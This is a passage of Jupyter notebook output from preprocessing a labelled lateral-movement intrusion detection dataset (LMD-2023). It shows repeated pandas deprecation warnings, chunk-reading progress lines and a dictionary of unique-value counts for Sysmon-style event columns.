     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 16...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 17...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 18...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 3/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential_processed\\LMD-2023 [1.87M Elements][Labelled]checked.csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 10...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 11...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 12...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 13...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 14...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 15...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 16...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 17...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 18...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 19...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 20...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Processing File 4/4: F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential_processed\\LMD-2023 [2.3M Elements][Labelled]checked.csv\n",
      "  Reading Chunk 1...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 2...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 3...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 4...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 5...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 6...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 7...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 8...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 9...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 10...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 11...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 12...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 13...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 14...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 15...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 16...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 17...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 18...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 19...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 20...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 21...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  Reading Chunk 22...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\Akshit Saini\\AppData\\Local\\Temp\\ipykernel_11788\\732496616.py:15: FutureWarning: DataFrame.applymap has been deprecated. Use DataFrame.map instead.\n",
      "  batch = batch.applymap(str)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unique Counts: {'SystemTime': 2936042, 'UtcTime': 53834, 'Image': 468, 'CommandLine': 2937, 'CurrentDirectory': 78, 'ParentImage': 190, 'ParentCommandLine': 433, 'Initiated': 2, 'SourceIsIpv6': 2, 'DestinationIsIpv6': 2, 'State': 1, 'ImageLoaded': 299, 'Signed': 2, 'SignatureStatus': 1, 'SourceProcessId': 344, 'SourceThreadId': 470, 'SourceImage': 44, 'TargetImage': 104, 'CallTrace': 228, 'SourceUser': 9, 'TargetUser': 13, 'TargetFilename': 8091, 'CreationUtcTime': 2760, 'TargetObject': 12471, 'Details': 2019, 'PipeName': 16, 'QueryStatus': 9, 'IsExecutable': 2, 'StartFunction': 5, 'PreviousCreationUtcTime': 514, 'ID': 4, 'Label': 3, 'binary_Level_0': 2, 'binary_Level_1': 1, 'binary_Level_2': 2, 'binary_Level_3': 2, 'binary_Level_4': 2, 'binary_Level_5': 2, 'binary_Level_6': 2, 'binary_Level_7': 2, 'binary_Task_0': 2, 'binary_Task_1': 2, 'binary_Task_2': 2, 'binary_Task_3': 2, 'binary_Task_4': 2, 'binary_Task_5': 2, 'binary_Task_6': 2, 'binary_Task_7': 2, 'binary_Protocol_0': 1, 'binary_Protocol_1': 2, 'binary_Protocol_2': 2, 'binary_Protocol_3': 2, 'binary_Protocol_4': 2, 'binary_Protocol_5': 2, 'binary_Protocol_6': 2, 'binary_Protocol_7': 1, 'binary_Version2_0': 2, 'binary_Version2_1': 2, 'binary_Version2_2': 2, 'binary_Version2_3': 1, 'binary_Version2_4': 2, 'binary_Version2_5': 2, 'binary_Version2_6': 2, 'binary_Version2_7': 1, 'binary_SchemaVersion_0': 2, 'binary_SchemaVersion_1': 2, 'binary_SchemaVersion_2': 2, 'binary_SchemaVersion_3': 2, 'binary_SchemaVersion_4': 2, 'binary_SchemaVersion_5': 2, 'binary_SchemaVersion_6': 2, 'binary_SchemaVersion_7': 2, 'binary_Signature_0': 2, 'binary_Signature_1': 2, 'binary_Signature_2': 2, 'binary_Signature_3': 2, 'binary_Signature_4': 2, 'binary_Signature_5': 2, 'binary_Signature_6': 2, 'binary_Signature_7': 2, 'binary_EventType_0': 2, 'binary_EventType_1': 2, 'binary_EventType_2': 2, 'binary_EventType_3': 2, 'binary_EventType_4': 2, 'binary_EventType_5': 2, 'binary_EventType_6': 2, 'binary_EventType_7': 2, 'binary_Configuration_0': 2, 'binary_Configuration_1': 2, 'binary_Configuration_2': 2, 'binary_Configuration_3': 2, 'binary_Configuration_4': 2, 'binary_Configuration_5': 2, 'binary_Configuration_6': 2, 'binary_Configuration_7': 2, 'binary_ConfigurationFileHash_0': 2, 'binary_ConfigurationFileHash_1': 2, 'binary_ConfigurationFileHash_2': 2, 'binary_ConfigurationFileHash_3': 2, 'binary_ConfigurationFileHash_4': 2, 'binary_ConfigurationFileHash_5': 2, 'binary_ConfigurationFileHash_6': 2, 'binary_ConfigurationFileHash_7': 2, 'binary_IntegrityLevel_0': 2, 'binary_IntegrityLevel_1': 2, 'binary_IntegrityLevel_2': 2, 'binary_IntegrityLevel_3': 2, 'binary_IntegrityLevel_4': 2, 'binary_IntegrityLevel_5': 2, 'binary_IntegrityLevel_6': 2, 'binary_IntegrityLevel_7': 2, 'binary_UserID_0': 1, 'binary_UserID_1': 1, 'binary_UserID_2': 2, 'binary_UserID_3': 2, 'binary_UserID_4': 2, 'binary_UserID_5': 2, 'binary_UserID_6': 2, 'binary_UserID_7': 2, 'binary_Computer_0': 2, 'binary_Computer_1': 2, 'binary_Computer_2': 2, 'binary_Computer_3': 2, 'binary_Computer_4': 2, 'binary_Computer_5': 2, 'binary_Computer_6': 2, 'binary_Computer_7': 2, 'binary_RuleName_0': 2, 'binary_RuleName_1': 2, 'binary_RuleName_2': 2, 'binary_RuleName_3': 2, 'binary_RuleName_4': 2, 'binary_RuleName_5': 2, 'binary_RuleName_6': 2, 'binary_RuleName_7': 2, 'binary_TerminalSessionId_0': 2, 'binary_TerminalSessionId_1': 2, 'binary_TerminalSessionId_2': 2, 'binary_TerminalSessionId_3': 2, 'binary_TerminalSessionId_4': 2, 'binary_TerminalSessionId_5': 2, 'binary_TerminalSessionId_6': 2, 'binary_TerminalSessionId_7': 2, 'binary_Version_0': 2, 'binary_Version_1': 2, 'binary_Version_2': 2, 'binary_Version_3': 2, 'binary_Version_4': 2, 'binary_Version_5': 2, 'binary_Version_6': 2, 'binary_Version_7': 2, 'binary_User_0': 2, 'binary_User_1': 2, 'binary_User_2': 2, 'binary_User_3': 2, 'binary_User_4': 2, 'binary_User_5': 2, 'binary_User_6': 2, 'binary_User_7': 2, 'binary_ParentUser_0': 2, 'binary_ParentUser_1': 2, 'binary_ParentUser_2': 2, 'binary_ParentUser_3': 2, 'binary_ParentUser_4': 2, 'binary_ParentUser_5': 2, 'binary_ParentUser_6': 2, 'binary_ParentUser_7': 2, 'binary_Guid_0': 2, 'binary_Guid_1': 3, 'binary_Guid_2': 2, 'binary_Guid_3': 2, 'binary_Guid_4': 3, 'binary_Guid_5': 3, 'binary_Guid_6': 2, 'binary_Guid_7': 2, 'binary_Guid_8': 2, 'binary_Guid_9': 3, 'binary_Guid_10': 3, 'binary_Guid_11': 3, 'binary_Guid_12': 3, 'binary_Guid_13': 3, 'binary_Guid_14': 3, 'binary_Guid_15': 3, 'binary_ProcessGuid_0': 3, 'binary_ProcessGuid_1': 3, 'binary_ProcessGuid_2': 3, 'binary_ProcessGuid_3': 3, 'binary_ProcessGuid_4': 3, 'binary_ProcessGuid_5': 3, 'binary_ProcessGuid_6': 3, 'binary_ProcessGuid_7': 3, 'binary_ProcessGuid_8': 3, 'binary_ProcessGuid_9': 3, 'binary_ProcessGuid_10': 3, 'binary_ProcessGuid_11': 3, 'binary_ProcessGuid_12': 3, 'binary_ProcessGuid_13': 3, 'binary_ProcessGuid_14': 3, 'binary_ProcessGuid_15': 3, 'binary_ParentProcessGuid_0': 3, 'binary_ParentProcessGuid_1': 3, 'binary_ParentProcessGuid_2': 3, 'binary_ParentProcessGuid_3': 3, 'binary_ParentProcessGuid_4': 3, 'binary_ParentProcessGuid_5': 3, 'binary_ParentProcessGuid_6': 3, 'binary_ParentProcessGuid_7': 3, 'binary_ParentProcessGuid_8': 3, 'binary_ParentProcessGuid_9': 3, 'binary_ParentProcessGuid_10': 3, 'binary_ParentProcessGuid_11': 3, 'binary_ParentProcessGuid_12': 3, 'binary_ParentProcessGuid_13': 3, 'binary_ParentProcessGuid_14': 3, 'binary_ParentProcessGuid_15': 3, 'binary_SourceProcessGUID_0': 3, 'binary_SourceProcessGUID_1': 3, 'binary_SourceProcessGUID_2': 3, 'binary_SourceProcessGUID_3': 3, 'binary_SourceProcessGUID_4': 3, 'binary_SourceProcessGUID_5': 3, 'binary_SourceProcessGUID_6': 3, 'binary_SourceProcessGUID_7': 3, 'binary_SourceProcessGUID_8': 3, 'binary_SourceProcessGUID_9': 3, 'binary_SourceProcessGUID_10': 3, 'binary_SourceProcessGUID_11': 3, 'binary_SourceProcessGUID_12': 3, 'binary_SourceProcessGUID_13': 3, 'binary_SourceProcessGUID_14': 3, 'binary_SourceProcessGUID_15': 3, 'binary_TargetProcessGUID_0': 3, 'binary_TargetProcessGUID_1': 3, 'binary_TargetProcessGUID_2': 3, 'binary_TargetProcessGUID_3': 3, 'binary_TargetProcessGUID_4': 3, 'binary_TargetProcessGUID_5': 3, 'binary_TargetProcessGUID_6': 3, 'binary_TargetProcessGUID_7': 3, 'binary_TargetProcessGUID_8': 3, 'binary_TargetProcessGUID_9': 3, 'binary_TargetProcessGUID_10': 3, 'binary_TargetProcessGUID_11': 3, 'binary_TargetProcessGUID_12': 3, 'binary_TargetProcessGUID_13': 3, 'binary_TargetProcessGUID_14': 3, 'binary_TargetProcessGUID_15': 3, 'binary_SourceProcessGuid_0': 3, 'binary_SourceProcessGuid_1': 3, 'binary_SourceProcessGuid_2': 3, 'binary_SourceProcessGuid_3': 3, 'binary_SourceProcessGuid_4': 3, 'binary_SourceProcessGuid_5': 3, 'binary_SourceProcessGuid_6': 3, 'binary_SourceProcessGuid_7': 3, 'binary_SourceProcessGuid_8': 3, 'binary_SourceProcessGuid_9': 3, 'binary_SourceProcessGuid_10': 3, 'binary_SourceProcessGuid_11': 3, 'binary_SourceProcessGuid_12': 3, 'binary_SourceProcessGuid_13': 3, 'binary_SourceProcessGuid_14': 3, 'binary_SourceProcessGuid_15': 3, 'binary_LogonGuid_0': 3, 'binary_LogonGuid_1': 3, 'binary_LogonGuid_2': 3, 'binary_LogonGuid_3': 3, 'binary_LogonGuid_4': 3, 'binary_LogonGuid_5': 3, 'binary_LogonGuid_6': 3, 'binary_LogonGuid_7': 3, 'binary_LogonGuid_8': 3, 'binary_LogonGuid_9': 3, 'binary_LogonGuid_10': 3, 'binary_LogonGuid_11': 3, 'binary_LogonGuid_12': 3, 'binary_LogonGuid_13': 3, 'binary_LogonGuid_14': 3, 'binary_LogonGuid_15': 3, 'binary_ThreadID_0': 3, 'binary_ThreadID_1': 3, 'binary_ThreadID_2': 3, 'binary_ThreadID_3': 3, 'binary_ThreadID_4': 3, 'binary_ThreadID_5': 3, 'binary_ThreadID_6': 3, 'binary_ThreadID_7': 3, 'binary_ThreadID_8': 3, 'binary_ThreadID_9': 3, 'binary_ThreadID_10': 3, 'binary_ThreadID_11': 3, 'binary_ThreadID_12': 3, 'binary_ThreadID_13': 3, 'binary_ThreadID_14': 3, 'binary_ThreadID_15': 3, 'binary_LogonId_0': 3, 'binary_LogonId_1': 3, 'binary_LogonId_2': 3, 'binary_LogonId_3': 3, 'binary_LogonId_4': 3, 'binary_LogonId_5': 3, 'binary_LogonId_6': 3, 'binary_LogonId_7': 3, 'binary_LogonId_8': 3, 'binary_LogonId_9': 3, 'binary_LogonId_10': 3, 'binary_LogonId_11': 3, 'binary_LogonId_12': 3, 'binary_LogonId_13': 3, 'binary_LogonId_14': 3, 'binary_LogonId_15': 3, 'binary_SourceHostname_0': 3, 'binary_SourceHostname_1': 3, 'binary_SourceHostname_2': 3, 'binary_SourceHostname_3': 3, 'binary_SourceHostname_4': 3, 'binary_SourceHostname_5': 3, 'binary_SourceHostname_6': 3, 'binary_SourceHostname_7': 3, 'binary_SourceHostname_8': 3, 'binary_SourceHostname_9': 3, 'binary_SourceHostname_10': 3, 'binary_SourceHostname_11': 3, 'binary_SourceHostname_12': 3, 'binary_SourceHostname_13': 3, 'binary_SourceHostname_14': 3, 'binary_SourceHostname_15': 3, 'binary_OriginalFileName_0': 3, 'binary_OriginalFileName_1': 3, 'binary_OriginalFileName_2': 3, 'binary_OriginalFileName_3': 3, 'binary_OriginalFileName_4': 3, 'binary_OriginalFileName_5': 3, 'binary_OriginalFileName_6': 3, 'binary_OriginalFileName_7': 3, 'binary_OriginalFileName_8': 3, 'binary_OriginalFileName_9': 3, 'binary_OriginalFileName_10': 3, 'binary_OriginalFileName_11': 3, 'binary_OriginalFileName_12': 3, 'binary_OriginalFileName_13': 3, 'binary_OriginalFileName_14': 3, 'binary_OriginalFileName_15': 3, 'binary_TargetProcessGuid_0': 3, 'binary_TargetProcessGuid_1': 3, 'binary_TargetProcessGuid_2': 3, 'binary_TargetProcessGuid_3': 3, 